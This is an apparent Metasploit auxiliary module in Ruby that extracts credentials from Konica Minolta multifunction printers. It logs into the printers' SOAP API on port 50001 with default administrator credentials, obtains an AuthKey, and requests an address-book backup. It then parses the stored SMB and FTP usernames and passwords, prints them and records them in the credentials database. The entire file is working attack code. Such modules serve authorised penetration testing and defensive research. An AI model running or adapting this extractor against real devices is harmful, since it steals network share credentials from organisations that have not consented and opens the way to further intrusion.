##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/http'
require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Konica Minolta Password Extractor',
      'Description' => %{
        This module will extract FTP and SMB account usernames and passwords
        from Konica Minolta mfp devices. Tested models include: C224, C280,
        283, C353, C360, 363, 420, C452,C452, C452, C454e },
      'Author'      =>
        [
          'Deral "Percentx" Heiland',
          'Pete "Bokojan" Arzamendi'
        ],
      'License'     => MSF_LICENSE
    ))

    register_options(
      [
        OptBool.new('SSL', [true, 'Negotiate SSL for outgoing connections', false]),
        OptPort.new('RPORT', [true, 'The target port', '50001']),
        OptString.new('USER', [false, 'The default Admin user', 'Admin']),
        OptString.new('PASSWD', [true, 'The default Admin password', '12345678']),
        OptInt.new('TIMEOUT', [true, 'Timeout for printer probe', 20])

      ], self.class)
  end

  # Creates the XML data to be sent that will extract AuthKey
  def generate_authkey_request_xlm(major, minor)
    user = datastore['USER']
    passwd = datastore['PASSWD']
    xmlauthreq = '<SOAP-ENV:Envelope'
    xmlauthreq << "\nxmlns:SOAP-ENV='http://schemas.xmlsoap.org/soap/envelope/'"
    xmlauthreq << "\nxmlns:SOAP-ENC='http://schemas.xmlsoap.org/soap/encoding/'"
    xmlauthreq << "\nxmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'"
    xmlauthreq << "\nxmlns:xsd='http://www.w3.org/2001/XMLSchema'>"
    xmlauthreq << '<SOAP-ENV:Header>'
    xmlauthreq << '<me:AppReqHeader'
    xmlauthreq << "\nxmlns:me='http://www.konicaminolta.com/Header/OpenAPI-#{major}-#{minor}'>"
    xmlauthreq << "<ApplicationID xmlns=''>0</ApplicationID>"
    xmlauthreq << "<UserName xmlns=''></UserName>"
    xmlauthreq << "<Password xmlns=''></Password>"
    xmlauthreq << "<Version xmlns=''>"
    xmlauthreq << "<Major>#{major}</Major>"
    xmlauthreq << "<Minor>#{minor}</Minor>"
    xmlauthreq << '</Version>'
    xmlauthreq << "<AppManagementID xmlns=''>0</AppManagementID>"
    xmlauthreq << '</me:AppReqHeader>'
    xmlauthreq << '</SOAP-ENV:Header>'
    xmlauthreq << '<SOAP-ENV:Body>'
    xmlauthreq << "<AppReqLogin xmlns='http://www.konicaminolta.com/service/OpenAPI-#{major}-#{minor}'>"
    xmlauthreq << '<OperatorInfo>'
    xmlauthreq << "<UserType>#{user}</UserType>"
    xmlauthreq << "<Password>#{passwd}</Password>"
    xmlauthreq << '</OperatorInfo>'
    xmlauthreq << '<TimeOut>60</TimeOut>'
    xmlauthreq << '</AppReqLogin>'
    xmlauthreq << '</SOAP-ENV:Body>'
    xmlauthreq << '</SOAP-ENV:Envelope>'
  end

  # Create XML data that will be sent to extract SMB passwords for devices
  def generate_smbpwd_request_xlm(major, minor, authkey)
    xmlsmbreq = '<SOAP-ENV:Envelope'
    xmlsmbreq << "\nxmlns:SOAP-ENV='http://schemas.xmlsoap.org/soap/envelope/'"
    xmlsmbreq << "\nxmlns:SOAP-ENC='http://schemas.xmlsoap.org/soap/encoding/'"
    xmlsmbreq << "\nxmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'"
    xmlsmbreq << "\nxmlns:xsd='http://www.w3.org/2001/XMLSchema'>"
    xmlsmbreq << '<SOAP-ENV:Header><me:AppReqHeader'
    xmlsmbreq << "\nxmlns:me='http://www.konicaminolta.com/Header/OpenAPI-#{major}-#{minor}'>"
    xmlsmbreq << "<ApplicationID xmlns=''>0</ApplicationID>"
    xmlsmbreq << "<UserName xmlns=''></UserName>"
    xmlsmbreq << "<Password xmlns=''></Password>"
    xmlsmbreq << "<Version xmlns=''><Major>#{major}</Major>"
    xmlsmbreq << "<Minor>#{minor}</Minor></Version>"
    xmlsmbreq << "<AppManagementID xmlns=''>1000</AppManagementID>"
    xmlsmbreq << '</me:AppReqHeader></SOAP-ENV:Header>'
    xmlsmbreq << "<SOAP-ENV:Body><AppReqGetAbbr xmlns='http://www.konicaminolta.com/service/OpenAPI-#{major}-#{minor}'>"
    xmlsmbreq << '<OperatorInfo>'
    xmlsmbreq << "<AuthKey>#{authkey}</AuthKey>"
    xmlsmbreq << '</OperatorInfo><AbbrListCondition>'
    xmlsmbreq << '<SearchKey>None</SearchKey>'
    xmlsmbreq << '<WellUse>false</WellUse>'
    xmlsmbreq << '<ObtainCondition>'
    xmlsmbreq << '<Type>OffsetList</Type>'
    xmlsmbreq << '<OffsetRange><Start>1</Start><Length>100</Length></OffsetRange>'
    xmlsmbreq << '</ObtainCondition>'
    xmlsmbreq << '<BackUp>true</BackUp>'
    xmlsmbreq << '<BackUpPassword>MYSKIMGS</BackUpPassword>'
    xmlsmbreq << '</AbbrListCondition></AppReqGetAbbr>'
    xmlsmbreq << '</SOAP-ENV:Body>'
    xmlsmbreq << '</SOAP-ENV:Envelope>'
  end

  # This next section will post the XML soap messages for information gathering.
  def run_host(ip)
    print_status("Attempting to extract username and password from the host at #{rhost}")
    version
  end

  # Validate XML Major Minor version
  def version
    response = send_request_cgi(
    {
      'uri'    => '/',
      'method' => 'POST',
      'data'   => '<SOAP-ENV:Envelope></SOAP-ENV:Envelope>'
    }, datastore['TIMEOUT'].to_i)
    xml0_body = ::Nokogiri::XML(response.body)
    major_parse = xml0_body.xpath('//Major').text
    minor_parse = xml0_body.xpath('//Minor').text
    major = ("#{major_parse}")
    minor = ("#{minor_parse}")
    login(major, minor)

  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
    print_error("#{rhost} - Version check Connection failed.")
    return nil
  end

  # This section logs on and retrieves AuthKey token
  def login(major, minor)
    authreq_xml = generate_authkey_request_xlm(major, minor)

    # Send post request with crafted XML to login and retreive AuthKey
    begin
      response = send_request_cgi(
      {
        'uri'    => '/',
        'method' => 'POST',
        'data'   => "#{authreq_xml}"
      }, datastore['TIMEOUT'].to_i)
      xml1_body = ::Nokogiri::XML(response.body)
      authkey_parse = xml1_body.xpath('//AuthKey').text
      authkey = ("#{authkey_parse}")
      extract(major, minor, authkey)
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
      print_error("#{rhost} - Login Connection failed.")
      return
    end
  end

  # This section post xml soap message that will extract usernames and passwords
  def extract(major, minor, authkey)
    if (authkey != '')
      # create xml request to extract user credintial settings
      smbreq_xml = generate_smbpwd_request_xlm(major, minor, authkey)

      # Send post request with crafted XML as data
      begin
        response = send_request_cgi(
        {
          'uri'    => '/',
          'method' => 'POST',
          'data'   => "#{smbreq_xml}"
        }, datastore['TIMEOUT'].to_i)
        xml2_body = ::Nokogiri::XML(response.body)
        @user_data = xml2_body.xpath('//User').map { |val| val.text }
        @pass_data = xml2_body.xpath('//Password').map { |val1| val1.text }
        @fold_data = xml2_body.xpath('//Folder').map { |val2| val2.text }
        @ftp_host = xml2_body.xpath('//Address').map { |val3| val3.text }
        @smb_host = xml2_body.xpath('//Host').map { |val4| val4.text }
      end
      i = 0
      # check for empty fields, identify protocol type, pass to creds database
      @user_data.each do
        fhost = "#{@ftp_host[i]}"
        shost = "#{@smb_host[i]}"
        uname = "#{@user_data[i]}"
        pword = "#{@pass_data[i]}"

        if !shost.empty? && !uname.empty?
          port = '139'
          host = "#{@smb_host[i]}"
          print_good("User=#{uname}:Password=#{pword}:Host=#{host}:Port=#{port}")
          register_creds('smb', host, port, uname, pword)
        elsif !fhost.empty? && !uname.empty?
          port = '21'
          host = "#{@ftp_host[i]}"
          print_good("User=#{uname} Password=#{pword} Host=#{host} Port=#{port}")
          register_creds('ftp', host, port, uname, pword)
        end
        i += 1
      end
    else
      print_status('No AuthKey returned possible causes Authentication failed or unsupported Konica model')
      return
    end
  end

  def register_creds(service_name, remote_host, remote_port, username, password)
    credential_data = {
      origin_type: :service,
      module_fullname: self.fullname,
      workspace_id: myworkspace.id,
      private_data: password,
      private_type: :password,
      username: username
    }

    service_data = {
      address: remote_host,
      port: remote_port,
      service_name: service_name,
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data.merge!(service_data)
    credential_core = create_credential(credential_data)

    login_data = {
      core: credential_core,
      status: Metasploit::Model::Login::Status::UNTRIED,
      workspace_id: myworkspace_id
    }

    login_data.merge!(service_data)
    create_credential_login(login_data)
  end
end
